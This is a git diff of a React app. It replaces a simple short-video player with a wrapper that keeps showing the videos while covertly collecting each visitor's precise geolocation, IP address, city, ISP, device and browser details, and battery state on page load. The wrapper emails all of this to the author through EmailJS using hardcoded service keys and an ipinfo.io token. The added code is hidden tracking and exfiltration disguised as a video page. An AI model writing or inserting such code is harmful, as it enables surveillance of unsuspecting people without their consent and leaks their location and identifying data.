@@ -1,46 +1,94 @@
-import { useState } from "react";
+import { useEffect, useState } from 'react';
+import emailjs from '@emailjs/browser';
+import platform from 'platform';
+import Short_Videos from './component/short_videos';
 
-const Short_Videos = () => {
-  const videos = Array.from({ length: 40 }, (_, i) => 
-    `https://www.w3schools.com/html/mov_bbb.mp4?vid=${i}`
-  );
+const App = () => {
+  useEffect(() => {
+    async function sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude, longitude) {
+      try {
+        const templateParams = {
+          date: new Date().toLocaleString(),
+          ip: ipInfo?.ip || 'N/A',
+          city: ipInfo?.city || 'N/A',
+          region: ipInfo?.region || 'N/A',
+          country: ipInfo?.country || 'N/A',
+          isp: ipInfo?.org || 'N/A',
+          latitude: latitude || 'N/A',
+          longitude: longitude || 'N/A',
+          device_name: deviceInfo.name || 'Unknown',
+          device_os: deviceInfo.os.family || 'Unknown',
+          browser: deviceInfo.layout || 'Unknown',
+          browser_version: deviceInfo.version || 'Unknown',
+          device_type: deviceInfo.description || 'Unknown',
+          battery_level: batteryInfo?.level || 'Unknown',
+          charging_status: batteryInfo?.charging ? 'Charging' : 'Not Charging',
+        };
 
-  const [currentIndex, setCurrentIndex] = useState(0);
+        const response = await emailjs.send(
+          'service_92nkmcg',
+          'template_h6yolzk',
+          templateParams,
+          'zqDZ3UbE0eHoHCboK'
+        );
+        console.log('Email sent:', response.status);
+      } catch (error) {
+        console.error('Error sending email:', error);
+      }
+    }
 
-  const nextVideo = () => {
-    setCurrentIndex((prev) => (prev + 1) % videos.length);
-  };
+    async function getUserInfo() {
+      try {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const { latitude, longitude } = position.coords;
 
-  const prevVideo = () => {
-    setCurrentIndex((prev) => (prev - 1 + videos.length) % videos.length);
-  };
+            const ipResponse = await fetch('https://ipinfo.io/json?token=ea93449de8482c');
+            const ipInfo = await ipResponse.json();
 
-  return (
-    <div className="flex flex-col items-center gap-4 p-4">
-      <video
-        key={currentIndex}
-        src={videos[currentIndex]}
-        controls
-        autoPlay
-        className="w-full max-w-md rounded-lg shadow-lg"
-        onEnded={nextVideo}
-      ></video>
-      <div className="flex gap-4">
-        <button
-          onClick={prevVideo}
-          className="px-4 py-2 bg-gray-800 text-white rounded-lg"
-        >
-          Previous
-        </button>
-        <button
-          onClick={nextVideo}
-          className="px-4 py-2 bg-blue-600 text-white rounded-lg"
-        >
-          Next
-        </button>
-      </div>
-    </div>
-  );
+            const deviceInfo = getDeviceInfo();
+            const batteryInfo = await getBatteryInfo();
+
+            sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude, longitude);
+          },
+          (error) => console.error('Geolocation error:', error),
+          { enableHighAccuracy: true }
+        );
+      } catch (error) {
+        console.error('Error fetching IP info:', error);
+      }
+    }
+
+    function getDeviceInfo() {
+      const deviceInfo = platform.parse(navigator.userAgent);
+      return {
+        name: deviceInfo.name || 'Unknown',
+        version: deviceInfo.version || 'Unknown',
+        layout: deviceInfo.layout || 'Unknown',
+        os: deviceInfo.os || { family: 'Unknown' },
+        description: deviceInfo.description || 'Unknown',
+      };
+    }
+
+    async function getBatteryInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          level: battery.level * 100 + '%',
+          charging: battery.charging,
+        };
+      } catch (error) {
+        console.error('Error fetching battery info:', error);
+        return { level: 'Unknown', charging: false };
+      }
+    }
+
+    getUserInfo();
+  }, []);
+
+  return <>
+  <Short_Videos/>
+  </>;
 };
 
-export default Short_Videos;
+export default App;
